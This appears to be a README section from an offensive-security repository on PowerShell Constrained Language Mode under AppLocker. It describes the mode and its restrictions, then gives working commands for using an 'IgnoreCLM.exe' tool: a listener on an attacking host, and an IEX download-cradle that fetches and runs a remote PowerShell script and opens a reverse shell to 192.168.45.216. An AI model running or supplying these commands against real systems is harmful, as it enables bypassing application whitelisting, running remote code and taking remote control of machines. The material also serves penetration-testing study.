## Resources
- https://note-com.translate.goog/tkusa/n/nb259d7e91710?_x_tr_sl=ja&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc&_x_tr_hist=true

## Constrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```
When AppLocker is is enabled, all PowerShell sessions are automatically set to ConstrainedLanguage mode for all users. However, there is an exception. PowerShell sessions launched with a High Integrity Level are set to FullLanguage mode instead.

Constrained Language mode severly limits PowerShells capabilities. A non-exhaustive list of restrictions are shown below:

- Limited access to .NET types (only core types like strings and arrays allowed)
- No dynamic code execution (e.g., Invoke-Expression, ScriptBlock::Create)
- No usage of Add-Type or inline C# code
- No custom classes, enums, or COM objects
- Restricted cmdlets (only core cmdlets allowed)
- No direct DLL calls or P/Invoke
- No access to Windows APIs or reflection
- PowerShell profiles may be ignored
- Limited external command execution
- Applies to PowerShell remoting sessions too

## Catching Full Language Shells

Using IgnoreCLM.exe in this repo, this can be utilizied with Powercat / SimpleCat-TCP to catch PowerShell shells that are running under FullLanguage mode.

```powershell
# Start Powercat / SimpleCat-TCP listener on attacking host [192.168.45.216]
SimpleCat-TCP -p 9001 -l

# Run IgnoreCLM.exe and execute following command
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.216/SimpleCat-TCP.ps1') ; SimpleCat-TCP -c 192.168.45.216 -p 9001 -ep
```
